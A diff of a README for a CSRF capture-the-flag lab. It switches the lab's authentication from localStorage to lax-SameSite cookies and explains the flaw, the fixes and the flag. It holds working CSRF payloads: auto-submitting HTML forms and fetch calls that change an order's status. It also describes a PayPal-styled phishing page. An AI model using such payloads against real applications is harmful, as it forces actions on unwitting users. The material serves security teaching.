@@ -4,16 +4,7 @@
 
 This vulnerability demonstrates a critical security flaw where the application performs state-changing operations (like updating order statuses) without proper CSRF protection. This allows attackers to trick authenticated users into executing unwanted actions on the application by making requests from a malicious website.
 
-> **Note on Lab Implementation vs Real-World Scenarios:**
->
-> For simplicity, this lab uses `localStorage` for authentication since both the vulnerable application and the exploit page are hosted on the same domain (localhost). This allows the attack to work in the lab environment.
->
-> However, in a real-world CSRF attack scenario, the exploit would be hosted on a **different domain** (e.g., `malicious-site.com`), making `localStorage` inaccessible due to the Same-Origin Policy. In such cases, CSRF attacks rely on **cookies** being automatically sent with cross-origin requests. The vulnerability would specifically require:
->
-> - Session authentication via cookies
-> - Cookies without the `SameSite=Strict` attribute (or with `SameSite=None` or `SameSite=Lax` allowing certain cross-site requests)
->
-> **Future Enhancement:** Upgrading this lab to use cookie-based authentication with a separate exploit domain would make the attack demonstration more realistic. Contributions via pull requests are welcome!
+The application uses HTTP-only cookies with `sameSite: "lax"` for authentication. While this protects against some cross-site scenarios, the `lax` policy still allows cookies to be sent on same-origin requests and on top-level navigations from external sites. Combined with the lack of CSRF tokens or origin validation, this makes the application vulnerable to CSRF attacks.
 
 ## Why This Is Dangerous
 
@@ -22,7 +13,7 @@ This vulnerability demonstrates a critical security flaw where the application p
 When an application accepts state-changing requests without CSRF protection, it creates a serious security vulnerability:
 
 1. **Unauthorized actions** - Attackers can force users to perform actions they didn't intend
-2. **Cookie-based authentication** - If authentication relies on cookies, browsers automatically include them in cross-origin requests
+2. **Cookie-based authentication** - Browsers automatically include cookies with requests, so the attacker doesn't need access to the token
 3. **User unawareness** - Victims may not realize an attack occurred until it's too late
 4. **Privilege abuse** - Attackers can exploit elevated privileges of authenticated users
 5. **Business impact** - Can lead to data modification, unauthorized transactions, or system compromise
@@ -33,7 +24,7 @@ When an application accepts state-changing requests without CSRF protection, it 
 
 - Verify the origin of state-changing requests
 - Use CSRF tokens to validate request authenticity
-- Implement SameSite cookie attributes
+- Implement SameSite cookie attributes (`strict` for sensitive operations)
 - Validate Referer/Origin headers for sensitive operations
 
 ## The Vulnerability
@@ -43,44 +34,25 @@ In this application, the order status update endpoint (`PATCH /api/orders/[id]`)
 1. **No CSRF token validation** - The endpoint accepts requests without verifying CSRF tokens
 2. **No origin verification** - The server doesn't check the request origin or referer
 3. **State-changing operation** - The endpoint modifies critical business data (order status)
-4. **Authentication mechanism** - The application uses localStorage to store authentication tokens, which allows same-origin attacks
-
-### Important Note About This Demonstration
-
-**This demonstration uses localStorage for authentication**, which means:
-
-- The attack works because the malicious page is hosted on the same domain as the application
-- The same-origin policy allows the malicious page to access localStorage from the same domain
-- This is a simplified scenario for educational purposes
-
-**In a real-world CSRF attack scenario:**
-
-- Applications typically use **cookies** for authentication instead of localStorage
-- With cookie-based authentication, the attack would work from **any external domain**
-- Browsers automatically include cookies with cross-origin requests (when `sameSite` is not set to `"strict"`)
-- The attacker wouldn't need JavaScript access to localStorage - a simple HTML form submission would be sufficient
-- This is why CSRF protection is critical: cookies are automatically sent by browsers, making cross-site attacks possible
+4. **Weak cookie policy** - The authentication cookie uses `sameSite: "lax"` instead of `"strict"`
 
 ### Vulnerable Code
 
-**Current Implementation (localStorage-based):**
+**Cookie Configuration:**
 
-This application stores the authentication token in `localStorage` on the client side:
-
-```typescript
-// Client-side: Token stored in localStorage
-localStorage.setItem("authToken", token);
-```
-
-The server reads the token from the `Authorization` header:
+The application sets the authentication cookie with `sameSite: "lax"`:
 
 ```typescript
-export async function getAuthenticatedUser(request: NextRequest) {
-  const authHeader = request.headers.get("authorization");
-  const token = authHeader?.replace("Bearer ", "") || null;
-  // ... validates token
-}
+response.cookies.set("authToken", token, {
+  httpOnly: true,
+  secure: process.env.NODE_ENV === "production",
+  sameSite: "lax", // ❌ Should be "strict" for sensitive operations
+  maxAge: 60 * 60 * 24 * 7,
+  path: "/",
+});
 ```
+
+While `httpOnly: true` prevents JavaScript from reading the cookie (protecting against XSS-based token theft), the `sameSite: "lax"` policy allows the cookie to be sent on same-origin requests, making CSRF attacks possible from the same domain.
 
 **Order Update Endpoint (No CSRF Protection):**
 
@@ -92,27 +64,21 @@ export async function PATCH(
   const user = await getAuthenticatedUser(request);
   // ❌ No CSRF token validation
   // ❌ No origin/referer verification
+  // The cookie is automatically included by the browser
   const { status } = await request.json();
   await prisma.order.update({ where: { id }, data: { status } });
 }
 ```
 
-**What Would Make This a True Cross-Site CSRF:**
+### Understanding `sameSite` Values
 
-If the application used cookies instead of localStorage:
+| Value    | Behavior                                                                    | CSRF Protection |
+| -------- | --------------------------------------------------------------------------- | --------------- |
+| `strict` | Cookie never sent on cross-site requests                                    | Strong          |
+| `lax`    | Cookie sent on top-level navigations (GET) but not on cross-site POST/fetch | Moderate        |
+| `none`   | Cookie always sent (requires `secure: true`)                                | None            |
 
-```typescript
-// ❌ Vulnerable cookie configuration
-response.cookies.set("authToken", token, {
-  httpOnly: false,
-  secure: false,
-  sameSite: "lax", // ❌ Should be "strict" for sensitive operations
-  maxAge: 60 * 60 * 24 * 7,
-  path: "/",
-});
-```
-
-With cookie-based authentication, the browser would automatically include the cookie with cross-origin requests, making true cross-site CSRF attacks possible.
+In this lab, the exploit page is served from the same origin, so `lax` does not block the request. In a real-world scenario, `lax` would block cross-origin `fetch` with `credentials: "include"`, but would still allow form-based GET requests that could be exploited depending on the endpoint design.
 
 ## Exploitation
 
@@ -137,13 +103,13 @@ To retrieve the flag `OSS{cr0ss_s1t3_r3qu3st_f0rg3ry}`, you need to exploit the 
 3. **Open the malicious website (simulated attacker's site):**
    - Navigate to the exploit file URL or open it directly
    - You can access it via: `http://localhost:3000/exploits/csrf-attack.html`
-   - **Note:** In this demonstration, the malicious page is hosted on the same domain as the application. This allows it to access your authentication token from localStorage. In a real-world attack with cookie-based authentication, the malicious page could be hosted on any external domain (e.g., `https://evil-attacker.com/phishing.html`), and the browser would still automatically include authentication cookies with the request.
+   - The page is designed to look like a phishing email from PayPal
 
 4. **Trigger the CSRF attack:**
-   - Click the "Verify Order Status" button in the phishing email
-   - The page reads your authentication token from localStorage and sends a `POST` request to change order `ORD-003` status to `DELIVERED`
-   - The request includes your authentication token in the `Authorization` header
-   - **This demonstrates the CSRF principle:** The attack works because the malicious page can access localStorage (same-origin) and make authenticated requests on your behalf. In a real-world scenario with cookies, the browser would automatically include authentication cookies with cross-origin requests, making the attack possible from any domain.
+   - Click the "Secure My Account Now" button in the phishing email
+   - The page sends a `POST` request to `/api/orders/ORD-003` with `credentials: "include"`
+   - The browser automatically attaches your `authToken` cookie to the request
+   - No JavaScript access to the token is needed — the browser handles cookie inclusion automatically
 
 5. **Retrieve the flag:**
    - After the attack, check the admin dashboard again
@@ -152,57 +118,20 @@ To retrieve the flag `OSS{cr0ss_s1t3_r3qu3st_f0rg3ry}`, you need to exploit the 
 
 **Alternative: Manual Exploitation**
 
-You can also create your own HTML file with this content. Note that with the current localStorage-based authentication, this would only work if hosted on the same domain:
+You can also trigger the CSRF attack manually from the browser console while logged in:
 
-```html
-<!DOCTYPE html>
-<html>
-  <body>
-    <form
-      id="csrfForm"
-      action="http://localhost:3000/api/orders/ORD-003"
-      method="POST"
-    >
-      <input type="hidden" name="status" value="DELIVERED" />
-    </form>
-    <script>
-      const token = localStorage.getItem("authToken");
-      fetch("http://localhost:3000/api/orders/ORD-003", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-          Authorization: `Bearer ${token}`,
-        },
-        body: JSON.stringify({ status: "DELIVERED" }),
-      });
-    </script>
-  </body>
-</html>
+```javascript
+fetch("/api/orders/ORD-003", {
+  method: "POST",
+  credentials: "include",
+  headers: { "Content-Type": "application/json" },
+  body: JSON.stringify({ status: "DELIVERED" }),
+})
+  .then((r) => r.json())
+  .then(console.log);
 ```
 
-**Note on Real-World CSRF with Cookies:**
-
-If the application used cookie-based authentication instead of localStorage, a true cross-site attack would be possible with a simple form submission (no JavaScript needed):
-
-```html
-<!DOCTYPE html>
-<html>
-  <body>
-    <form
-      id="csrfForm"
-      action="https://target-app.com/api/orders/ORD-003"
-      method="POST"
-    >
-      <input type="hidden" name="status" value="DELIVERED" />
-    </form>
-    <script>
-      document.getElementById("csrfForm").submit();
-    </script>
-  </body>
-</html>
-```
-
-In this scenario, the browser would automatically include authentication cookies from `target-app.com` with the form submission, even though the form is hosted on a different domain. This is why `sameSite: "strict"` is crucial for cookie-based authentication.
+The key insight is that `credentials: "include"` tells the browser to send cookies along with the request. Since the `authToken` cookie has `sameSite: "lax"`, it is included in same-origin requests automatically.
 
 ## Secure Implementation
 
